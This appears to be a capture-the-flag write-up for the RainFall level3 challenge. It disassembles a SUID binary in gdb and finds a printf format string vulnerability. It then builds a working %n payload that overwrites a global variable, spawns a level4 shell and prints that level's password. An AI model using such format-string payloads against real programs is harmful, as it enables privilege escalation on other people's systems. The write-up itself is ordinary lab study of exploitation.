After running the command `ls -l level3`, we observe the following output:

```
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

From this output, we can see that the binary `level3` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level4`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level4` user.


## Debugging
### simple 
```
level3@RainFall:~$ ./level3 
helloworld
helloworld

```
After running ./level3, we found that it opens stdin to read input, and whatever input is provided, such as hello world, it will print it.

### with gdb (peda)
Now, let's debug the binary using GDB:  
```bash
gdb level3
   
disassemble main   
```
**Output:** 
``` output
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
```
We see in the assembly that it calls the function v. Let's discover what v does.
```gdb
disassemble v
```
``` output
Dump of assembler code for function v:
   0x080484a4 <+0>:	    push   ebp
   0x080484a5 <+1>:	    mov    ebp,esp
   0x080484a7 <+3>:	    sub    esp,0x218
   0x080484ad <+9>:	    mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

After analyzing and debugging, I found the following:  

At address:  
```
0x080484df <+59>: cmp eax, 0x40  // Compare eax with 64
```
If the comparison returns 0 (i.e., eax == 64), the program moves the address `0x804860d` into the memory location pointed to by `esp`:  
```
0x0804850c <+104>: mov DWORD PTR [esp], 0x804860d  
```
This address corresponds to the string `/bin/sh`. After that, the program calls `system()`:  
```
0x08048513 <+111>: call 0x80483c0 <system@plt>
```
this example in gdb :
```gdb
[-------------------------------------code-------------------------------------]
   0x80484cc <v+40>:	lea    eax,[ebp-0x208]
   0x80484d2 <v+46>:	mov    DWORD PTR [esp],eax
   0x80484d5 <v+49>:	call   0x8048390 <printf@plt>
=> 0x80484da <v+54>:	mov    eax,ds:0x804988c
   0x80484df <v+59>:	cmp    eax,0x40
   0x80484e2 <v+62>:	jne    0x8048518 <v+116>
   0x80484e4 <v+64>:	mov    eax,ds:0x8049880
   0x80484e9 <v+69>:	mov    edx,eax
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484da in v ()
gdb-peda$ x/x 0x804988c
0x804988c <m>:	0x00000000
gdb-peda$ set *0x804988c = 64
gdb-peda$ ni

[-------------------------------------code-------------------------------------]
   0x80484d2 <v+46>:	mov    DWORD PTR [esp],eax
   0x80484d5 <v+49>:	call   0x8048390 <printf@plt>
   0x80484da <v+54>:	mov    eax,ds:0x804988c
=> 0x80484df <v+59>:	cmp    eax,0x40
   0x80484e2 <v+62>:	jne    0x8048518 <v+116>
   0x80484e4 <v+64>:	mov    eax,ds:0x8049880
   0x80484e9 <v+69>:	mov    edx,eax
   0x80484eb <v+71>:	mov    eax,0x8048600
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080484df in v ()
gdb-peda$ x/x 0x804988c
0x804988c <m>:	0x00000040
gdb-peda$ x/d 0x804988c
0x804988c <m>:	64
gdb-peda$ ni

[-------------------------------------code-------------------------------------]
   0x80484d5 <v+49>:	call   0x8048390 <printf@plt>
   0x80484da <v+54>:	mov    eax,ds:0x804988c
   0x80484df <v+59>:	cmp    eax,0x40
=> 0x80484e2 <v+62>:	jne    0x8048518 <v+116>
   0x80484e4 <v+64>:	mov    eax,ds:0x8049880
   0x80484e9 <v+69>:	mov    edx,eax
   0x80484eb <v+71>:	mov    eax,0x8048600
   0x80484f0 <v+76>:	mov    DWORD PTR [esp+0xc],edx
                                                              JUMP is NOT taken
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080484e2 in v ()
gdb-peda$ x/d 0x804988c
0x804988c <m>:	64
gdb-peda$ ni
[-------------------------------------code-------------------------------------]
   0x80484da <v+54>:	mov    eax,ds:0x804988c
   0x80484df <v+59>:	cmp    eax,0x40
   0x80484e2 <v+62>:	jne    0x8048518 <v+116>
=> 0x80484e4 <v+64>:	mov    eax,ds:0x8049880
   0x80484e9 <v+69>:	mov    edx,eax
   0x80484eb <v+71>:	mov    eax,0x8048600
   0x80484f0 <v+76>:	mov    DWORD PTR [esp+0xc],edx
   0x80484f4 <v+80>:	mov    DWORD PTR [esp+0x8],0xc

Legend: code, data, rodata, value
0x080484e4 in v ()
```
Understanding the behavior of function `p`, we now look for an exploit.  

Before the comparison, we notice a `printf` call:  
```
0x080484d5 <+49>: call 0x8048390 <printf@plt>
```
Since `printf` is used, we check for a **format string vulnerability**. If present, we can exploit it to gain control over execution.  

Let's start with a simple command to print two values from the stack:  
```bash
level3@RainFall:~$ (python -c 'print("%x %x %x")') | ./level3 
200 b7fd1ac0 b7ff37d0
```

We can see the addresses from the stack.  

Now, let's determine the position of the address `0x8049880` when injected:  
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%x "*4'; cat) | ./level3  
�200 b7fd1ac0 b7ff37d0 804988c  
```
From the output, we can see that our address appears at **position four**.  

Now, let's build the payload:  
```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08%60x%4$n"'; cat) | ./level3  
�                                                         200  
Wait, what?!  
whoami  
level4  
cat /home/user/level4/.pass  
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa  
```